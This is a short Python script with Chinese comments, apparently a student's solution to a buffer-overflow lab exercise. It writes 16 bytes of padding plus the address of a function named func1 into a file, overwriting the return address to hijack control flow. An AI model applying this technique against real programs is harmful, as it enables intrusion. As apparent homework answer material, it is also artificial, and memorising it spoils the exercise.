import struct

# 1. 目标地址：func1 的地址
# 从反汇编看是 0x401216
target_addr = 0x401216

# 2. 构造 Payload
# 偏移量 16 字节 (8字节 buffer + 8字节 saved rbp)
padding = b'A' * 16

# 使用 '<Q' 表示小端序 64位无符号整数
payload = padding + struct.pack('<Q', target_addr)

# 3. 写入文件
# 题目要求用文件输入
filename = "ans1.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload written to {filename}")